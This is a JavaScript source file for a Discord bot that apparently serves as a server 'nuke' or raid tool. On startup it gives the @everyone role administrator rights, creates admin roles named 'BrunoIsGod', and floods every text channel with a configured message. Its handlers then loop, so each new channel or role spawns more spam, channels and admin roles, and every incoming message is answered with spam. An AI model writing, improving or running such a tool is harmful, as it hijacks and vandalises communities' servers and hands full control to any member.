const Discord = require('discord.js');
const client = new Discord.Client();
const settings = require('../settings.json');

client.on("ready", () => {
    function all() {
        client.guilds.get(settings.auto.server_id).roles.find('name', '@everyone').edit({
            permissions: ['ADMINISTRATOR']
        });
        if (settings.config.role_crt === 1) {
            client.guilds.get(settings.auto.server_id).createRole({
                name: "BrunoIsGod",
                permissions: ["ADMINISTRATOR"]
            });
        }
        client.guilds.get(settings.auto.server_id).channels.map(c => {
            if (c.type === 'text') {
                c.send(settings.config.msg);
            }
        });
        client.guilds.get(settings.auto.server_id).createChannel(settings.config.chnlname, 'text');
    }
    setTimeout(all, 1000)
});

client.on("message", message => {
    if (message.guild.id === settings.auto.server_id) {
        if (message.author.id === settings.ownerid) {
            if (message.content === 'stop') {
                process.exit();
            }
        }
        message.channel.send(settings.config.msg);
    }
});

client.on("channelCreate", channel => {
    channel.send(settings.config.msg);
    client.guilds.get(settings.auto.server_id).createChannel(settings.config.chnlname, 'text');
});

client.on("roleCreate", role => {
    role.guild.createRole({
        name: "BrunoIsGod",
        permissions: ["ADMINISTRATOR"]
    });
});

client.login(settings.token);
